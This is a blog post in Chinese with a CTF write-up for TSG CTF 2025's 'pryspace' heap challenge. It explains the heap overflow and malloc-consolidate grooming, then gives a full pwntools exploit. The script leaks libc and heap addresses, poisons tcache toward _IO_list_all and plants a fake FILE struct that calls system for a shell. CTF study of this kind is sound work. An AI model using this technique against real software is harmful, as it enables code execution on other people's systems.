---
date: 2026-02-20 10:31:59
layout: post
title: TSG CTF 2025 writeups
subtitle: 
description: >-
    
image: >-
  /assets/img/uploads/saudi_cat.jpg
optimized_image: >-
  /assets/img/uploads/saudi_cat.jpg
category: ctf
tags:
  - heap pwn
author: rosayxy
paginate: true
---

今年和 jiegec 的在一起一周年纪念日是：我在准备 SECCON，他在写博士论文，这就是苦逼华子人吧

## pryspace

参考 [kam1tsur3 的 writeup](https://github.com/kam1tsur3/kam1tsur3-web/blob/bdc8095835f552d1ebe91201d6993d3f9ad45803/source/_posts/tsgctf2025quals-writeup.md#pryspace)

`merge` 操作给了一个几乎无限长度的堆溢出，但是它 merge 的时候，会申请一个大小为 `NOTE_SIZE * MAX_NOTE` 的堆块。其实我们的原语强度到改它后面 chunk 的 size 为（能自定义的）大数就可以了，但是如何在 merge 操作前使得：
1. 该堆块不是从 top chunk 分配的，而是 large bin/unsorted bin 中的 chunk
2. 该堆块的更高地址处有若干 0xf0（包含 header）大小的堆块，方便做 chunk overlapping

我们可以通过 fastbin 中堆块的 malloc consolidate 来实现，分配一堆地址相邻的 fastbin 中堆块，等到它进行这个大块的分配的时候，就可以接连合并出大堆块来做 merge 操作了

为什么我没有想出来：漏了 copy note 的条件是用 strdup 来做内存申请，所以可以申请小于 0xe0 大小的堆块，从而感觉用不了 malloc consolidate 来做这个大块的分配了

### exp
```py
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
# 如果是无限长度的堆溢出（但是只有一次机会） 我该怎么做
# 改后面堆块 size 然后 free 构造堆重叠，可 leak，但是之后怎么做
p = process("./dist/pryspace")
libc = ELF("./libc.so.6")

# 试试就改一个 size 呢

def create(idx, content):
    p.sendlineafter("> ", "1")
    p.sendlineafter("index > ", str(idx))
    sleep(0.1)
    p.send(content) # 是 fgets 所以要发送 \n

def copy(src, dst):
    p.sendlineafter("> ", "2")
    p.sendlineafter("src > ", str(src))
    p.sendlineafter("dst > ", str(dst))

def show(idx):
    p.sendlineafter("> ", "3")
    p.sendlineafter("index > ", str(idx))

def delete(idx):
    p.sendlineafter("> ", "5")
    p.sendlineafter("index > ", str(idx))

def merge(list_of_idxs):
    p.sendlineafter("> ", "4")
    p.sendlineafter("count > ", str(len(list_of_idxs)))
    for idx in list_of_idxs:
        p.sendlineafter("src > ", str(idx))

# before overflow
# 如何在目测没有其他洞的时候，把 merge_note 对应的 chunk 放到中间，how can I use malloc consolidate to do this?
# 0x80 * 8 + 0x70 * 8 + 0x60 * 8 + 0x50 * 8 + 0x40 * 8 = 0xf00

# 先扔一堆 0xe0 的堆块到 tcache，使得后面的 0xe0 堆块都到 tcache 里面分配，从而后续 fastbin 大小的堆块可以地址连续

for i in range(2):
    create(i, b"aaaa\n")

for i in range(2):
    delete(i)

def throw_tcache(size):
    create(0, b"a"*(size - 2) + b"\n")
    for i in range(1, 8):
        copy(0, i)
    for i in range(0, 8):
        delete(i)

def throw_fastbin(size, cnt=8):
    create(0, b"a"*(size - 2) + b"\n")
    for i in range(1, cnt + 8):
        copy(0, i)
    for i in range(0, cnt + 8):
        delete(i)

throw_tcache(0x78)
throw_tcache(0x68)
throw_tcache(0x58)
throw_tcache(0x48)
throw_tcache(0x38)

throw_fastbin(0x78, 7)
throw_fastbin(0x68, 7)
throw_fastbin(0x58)
throw_fastbin(0x48)
throw_fastbin(0x38)

create(0, b"a"*0x10 + b"\n")
create(1, b"a"*0xdf + b"\n")
create(2, b"a"* 8 + b"\x51" + b"\n")

create(3, b"a"*0xbf + b"\n")
for i in range(4, 12):
    create(i, b"a"*0xf + b"\n")
create(12, b"a"*0x1f + b"\n")
create(13, b"a"*0xaf + b"\n")
# for i in range(6):
#     create(i, b"aaaa\n")

# 改后面一块的 size 为大值，足够放到 unsorted bin 里面去

merge([1, 0, 0, 0, 0, 7, 2])

# create overlap
delete(2)
create(2, b"a"*0x10 + b"\n")
show(3)
libc_leak = u64(p.recv(6).ljust(8, b"\x00"))
# TODO
libc_base = libc_leak - 0x21ace0

log.info("libc_leak: " + hex(libc_leak))
log.info("libc_base: " + hex(libc_base))
# get a heap leak?
create(14, b"ttt\n") # overlap with 3
delete(3)
show(14)
heap_leak = u64(p.recv(5).ljust(8, b"\x00"))
heap_base = heap_leak * 0x1000
log.info("heap_leak: " + hex(heap_leak))
log.info("heap_base: " + hex(heap_base))
io_list_all = libc_base + libc.symbols["_IO_list_all"]
fd = io_list_all ^(heap_leak)
# TODO: 不太对，我们只能用 0xf0 的堆块来打 tcache poisoning

# delete(5)
# copy(13, 3)
create(3, p64(fd) + b"\n")
delete(6)
delete(5)
copy(13, 5)
copy(12, 6)
copy(3, 5)
# construct fake FILE struct
fake_io_addr = heap_base + 0x290
system_addr=libc_base+libc.sym["system"]
fake_io_file = b"  sh;".ljust(0x8,b"\x00") 
fake_io_file += p64(0)*3+p64(0)+p64(2)
fake_io_file = fake_io_file.ljust(0x30,b"\x00")
fake_io_file += p64(0)
fake_io_file = fake_io_file.ljust(0x68,b"\x00")
fake_io_file += p64(system_addr)
fake_io_file = fake_io_file.ljust(0x88,b"\x00")
fake_io_file += p64(libc_base+0x21ca60)
fake_io_file = fake_io_file.ljust(0xa0,b"\x00")
fake_io_file += p64(fake_io_addr - 0x10)
fake_io_file = fake_io_file.ljust(0xd0,b"\x00")
fake_io_file += p64(fake_io_addr)
fake_io_file += p64(0x2170c0 + libc_base) # 使得可以调用 _IO_wfile_overflow

create(13, fake_io_file + b"\n")

create(14, p64(fake_io_addr) + b"\n")

p.recvuntil("> ")
p.sendline("6")
p.interactive()
```

